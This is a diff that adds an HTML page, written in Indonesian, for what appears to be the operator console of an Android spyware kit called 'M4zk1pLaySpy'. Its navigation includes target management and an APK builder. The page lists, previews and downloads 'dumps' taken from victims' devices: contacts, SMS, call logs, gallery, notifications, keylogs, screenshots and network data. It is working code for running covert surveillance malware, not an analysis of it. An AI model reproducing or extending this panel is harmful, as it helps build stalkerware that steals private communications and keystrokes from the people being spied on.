@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Hasil Dump — M4zk1pLaySpy</title>
+<link rel="stylesheet" href="/static/css/style.css">
+</head>
+<body>
+<div class="shell">
+  <aside class="side">
+    <div class="brand"><img src="/static/img/garuda.svg" alt=""><div><b>M4ZK1PL4Y</b><span>SPY CONSOLE</span></div></div>
+    <nav class="nav">
+      <a href="/dashboard">▣ <span class="lbl">DASHBOARD</span></a>
+      <a href="/targets">◈ <span class="lbl">TARGET</span></a>
+      <a href="/build">⚙ <span class="lbl">BUILD APK</span></a>
+      <a href="/dumps">⇩ <span class="lbl">HASIL DUMP</span></a>
+      <a href="/admin">☰ <span class="lbl">ADMIN</span></a>
+    </nav>
+    <div class="side-foot"><div id="clock">--:--:--</div><a href="#" id="logout" style="display:block;margin-top:10px;color:var(--red)">▸ KELUAR</a></div>
+  </aside>
+  <main class="main">
+    <header class="top"><h2 class="glitch" data-t="HASIL DUMP">HASIL DUMP</h2>
+      <span class="pill"><span id="tot">0</span> FILE</span>
+      <div class="spacer"></div>
+      <select class="inp" id="kind" style="width:160px;padding:8px 12px">
+        <option value="">SEMUA JENIS</option><option value="contacts">KONTAK</option><option value="sms">SMS</option>
+        <option value="calls">LOG TELEPON</option><option value="gallery">GALERI</option><option value="notif">NOTIFIKASI</option>
+        <option value="keylog">KEYLOG</option><option value="screen">TANGKAPAN LAYAR</option><option value="net">JARINGAN</option>
+      </select>
+    </header>
+    <div class="content"><div class="card"><div class="card-h"><b>ARSIP</b></div>
+      <div class="card-b" style="padding:0"><table>
+        <thead><tr><th>Jenis</th><th>Perangkat</th><th>File</th><th>Ukuran</th><th>Waktu</th><th></th></tr></thead>
+        <tbody id="rows"><tr><td colspan="6" class="empty">memuat…</td></tr></tbody>
+      </table></div></div></div>
+  </main>
+</div>
+<div class="toast-wrap" id="tw"></div>
+
+<script type="module">
+import { $, api, post, toast, esc, fmt, clock, markNav } from '/static/js/core.js';
+markNav(); clock($('#clock'));
+$('#logout').onclick = async (e) => { e.preventDefault(); await post('/api/logout'); location.href = '/'; };
+
+async function load() {
+  const d = await api('/api/dumps?kind=' + encodeURIComponent($('#kind').value));
+  $('#tot').textContent = d.dumps.length;
+  $('#rows').innerHTML = d.dumps.map((x) => `
+    <tr><td><span class="tag">${esc(x.kind)}</span></td>
+      <td>${esc(x.brand || '')} ${esc(x.model || '')}</td>
+      <td class="mono">${esc(x.filename)}</td><td>${fmt.bytes(x.size)}</td>
+      <td>${fmt.date(x.created)}</td>
+      <td><a class="btn sm ghost" href="/api/dumps/${esc(x.id)}/preview" target="_blank">LIHAT</a>
+          <a class="btn sm" href="/api/dumps/${esc(x.id)}/download">UNDUH</a>
+          <button class="btn sm ghost" data-del="${esc(x.id)}">X</button></td></tr>`).join('')
+    || '<tr><td colspan="6" class="empty">belum ada dump</td></tr>';
+  document.querySelectorAll('[data-del]').forEach((b) => {
+    b.onclick = async () => { await api('/api/dumps/' + b.dataset.del, { method: 'DELETE' }); load(); };
+  });
+}
+$('#kind').onchange = load;
+load(); setInterval(load, 20000);
+</script>
+</body>
+</html>
